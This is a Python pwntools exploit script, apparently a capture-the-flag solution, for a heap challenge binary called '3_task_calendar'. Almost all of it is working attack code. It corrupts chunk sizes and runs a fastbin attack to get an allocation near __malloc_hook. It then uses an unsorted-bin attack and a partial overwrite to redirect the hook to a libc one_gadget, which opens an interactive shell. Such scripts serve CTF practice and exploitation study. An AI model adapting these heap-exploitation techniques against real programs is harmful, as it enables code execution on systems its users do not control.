from pwn import *
context.log_level='debug'
gadget =[0x45216,0x4526a,0xf02a4,0xf1147]

p = process('./3_task_calendar')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def get_base(p):
	f = open('/proc/'+str(pidof(p)[0])+'/maps','r')
	while 1:
		tmp = f.readline()
		print tmp
		if 'libc-2.23.so' in tmp:
			libc_addr = int('0x'+tmp.split('-')[0],16)
			f.close()
			break
	log.info("libc_addr:%#x",libc_addr)
	return libc_addr
def add(day,size):
	p.sendlineafter("4. exit\nchoice> ",'1')
	p.sendlineafter("7. Sunday\nchoice> ",str(day+1))
	p.sendlineafter("size> ",str(size))
def edit(day,size,info):
	p.sendlineafter("4. exit\nchoice> ",'2')
	p.sendlineafter("7. Sunday\nchoice> ",str(day+1))
	p.sendlineafter("size> ",str(size))
	p.sendafter("info> ",info)
def remove(day):
	p.sendlineafter("4. exit\nchoice> ",'3')
	p.sendlineafter("7. Sunday\nchoice> ",str(day+1))

#libc_base = get_base(p)&0xffff
p.sendlineafter("input calendar name> ",'0gur1')
add(0,0x60)# 0x00
add(0,0x60)# 0x70
add(0,24)  # 0xe0 
add(1,0x60)# 0x100
add(2,0x60)# 0x170
add(3,0x60)# 0x1e0

#overwrite #1's size to an unsorted bin size
edit(0,24,'0'*24+'\xe1')
remove(1)
gdb.attach(p)
add(0,0x60)
add(0,0x60)

#now #1's chunk(0x100) is in the unsorted bin
#fastbin attack
remove(2)
remove(3)
edit(3,1,'\n')

#now there are 3 chunks in fastbin:#3->#1->main_aren+88
#make:#3->#0->malloc_hook-0x23
bytes = (get_base(p)+libc.symbols['__malloc_hook']-0x23)&0xffff
log.info("bytes:%#x",bytes)
edit(1,1,p32(bytes)[:-2])
add(0,0x60)#point to 3's chunk
add(0,0x60)#point to 1's chunk
add(0,0x60)#point to malloc_hook-0x23

#edit(0,18,'a'*3+p64(0)+p64(0x7f))

#using unsorted bin attack to overwrite 
add(1,24)
add(2,0x50)
add(3,0x50)
add(3,0x50)
edit(1,24,'0'*24+'\xc1')
remove(2)

bytes = (get_base(p)+libc.symbols['__malloc_hook'])&0xffff
edit(2,8,'a'*8+'\n')
edit(1,24,'0'*24+'\x61')
add(3,0x50)

#change main_arena+88 to one_gadget
bytes = (get_base(p)+gadget[2])&0xffffff
edit(0,21,19*'a'+p32(bytes)[:-1])

add(2,0x20)



p.interactive()
